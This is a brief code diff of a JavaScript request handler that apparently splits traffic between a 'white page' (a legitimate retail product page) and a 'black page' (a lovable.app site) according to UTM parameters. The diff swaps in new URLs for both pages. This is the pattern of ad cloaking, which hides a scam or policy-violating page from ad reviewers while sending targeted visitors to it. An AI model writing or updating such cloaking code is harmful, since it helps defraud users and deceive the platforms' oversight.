@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://zyrontech.com.au/products/20000mah-power-bank-65w";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.balsamhill.com/f/outdoor-countryside-pumpkin-grove-artificial-fall-foliage?sku=4101629";
+    const blackPageURL = "https://ubuzznotifier.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
